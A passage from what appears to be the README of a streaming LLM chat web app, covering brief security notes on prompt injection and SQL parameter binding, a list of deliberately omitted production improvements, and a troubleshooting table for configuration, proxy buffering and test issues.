- **Prompt injection (general):** treat both user input *and* model output as untrusted; never give the model authority the user doesn't have; this app has no tools or retrieval, which is what keeps the blast radius small.
- **SQL:** all values are bound parameters; the one dynamic part (column names in `update_message`) is whitelisted.

## Production improvements

Not implemented, on purpose: they are separate lessons.

- **Auth & multi-tenancy:** users, `conversations.user_id`, authorization on every route (today anyone who can reach the API sees all conversations).
- **Database:** PostgreSQL (many writers, replication, real migrations such as Alembic) instead of single-file SQLite; async driver.
- **Rate limiting & quotas:** per-user token/cost budgets, shared store (Redis) or at the API gateway; trusted `X-Forwarded-For`.
- **Exact token counting** with the model's tokenizer; running-summary memory for long chats.
- **Observability:** OpenTelemetry traces, Prometheus metrics, alerting on time-to-first-token and error rate, spend alerts.
- **Proxy hygiene:** disable response buffering for `text/event-stream` (we send `X-Accel-Buffering: no`), idle/keep-alive comments, request-size limits at the edge.
- **Resumable streams / multi-instance:** run workers behind a queue with a stream-id so a reconnect can resume instead of losing the reply.
- **Cost:** prompt caching, cheaper models for easy tasks (the title call already supports `OPENAI_TITLE_MODEL`), output limits per plan.
- **Moderation, PII redaction, retention policy** for stored conversations.

## Troubleshooting

| Symptom | Cause / fix |
|---|---|
| Server exits: "Cannot start, fix the configuration" | set `OPENAI_API_KEY` and `OPENAI_MODEL` in `.env` |
| UI says "Could not reach the server" | backend not running on `:8501` (or set `VITE_API_URL`) |
| Costs show "cost n/a" | the model has no entry in `AI/data/prices.toml` |
| Vite starts on a different port | port 3100 is busy; fine (dev CORS allows any localhost port) |
| Text appears all at once behind nginx | proxy buffering; keep `X-Accel-Buffering: no`, set `proxy_buffering off` |
| `pytest` crashes importing `launch`/`ament` | a sourced ROS workspace leaks plugins via `PYTHONPATH`; `pytest.ini` already blocks them |
| 409 right after pressing Stop | the server is still finalizing the cancelled reply; retry in a moment |
